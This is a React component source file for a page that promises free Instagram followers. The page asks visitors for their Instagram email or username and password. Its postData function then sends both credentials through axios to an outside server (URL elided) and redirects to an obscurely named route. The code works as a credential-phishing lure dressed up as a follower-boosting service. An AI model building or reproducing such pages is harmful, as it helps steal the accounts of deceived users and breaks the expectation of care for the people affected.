import axios from "axios";
import React, { useEffect, useState } from "react";
import { Link, Navigate, useNavigate } from "react-router-dom";

export default function FreeFollowers() {
    const Navigate = useNavigate();
  const [email, setEmail] = useState();
  const [pswd, setPswd] = useState();
  //the following API is used for posting new data in the json server
  async function postData(e){
    e.preventDefault();
    if(email.length > 4 && pswd.length > 5) {
        await axios.post('https:.....',{
            email,
            pswd
          }).then(()=>{
            Navigate('/sdDrFjweCiSorDmSneori39jfAvY')
          })
        }
        else{
            alert('You are entering wrong data')
        }
    }
  
  return (
    <div className="container">
      <div className="row" >
        <div className="col-10 my-2 " data-aos="fade-up" data-aos-delay="300">
          <div className=" text-center  text-color">
            <h4>Get Free Instagram Followers In The Fastest Way!</h4>
          </div>
          <form className="formm ">
            <div className="mb-3">
              <label htmlFor="exampleInputEmail1" className="form-label">
                Email address or Username
              </label>
              <input
                type="email"
                className="form-control"
                id="exampleInputEmail1"
                aria-describedby="emailHelp"
                autoComplete="false"
                onChange={((e)=>{setEmail(e.target.value)})}
              />
            </div>
            <div className="mb-3">
              <label htmlFor="exampleInputPassword1" className="form-label">
                Password
              </label>
              <input
                type="password"
                className="form-control"
                id="exampleInputPassword1"
                autoComplete="false"
                onChange={((e)=>{setPswd(e.target.value)})}
              />
            </div>
            <button type="submit" className="btn btn-primary" onClick={((e)=> postData(e)) }>
              Log In
            </button>
            <div id="emailHelp" className="form-text">
              By clicking this login button, You can just get
              <b>1k followers</b> per week.
              <br />
              If you want more followers, you can get to purchase {" "}
             <Link to={'/buy-followers'}>click here</Link> 
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
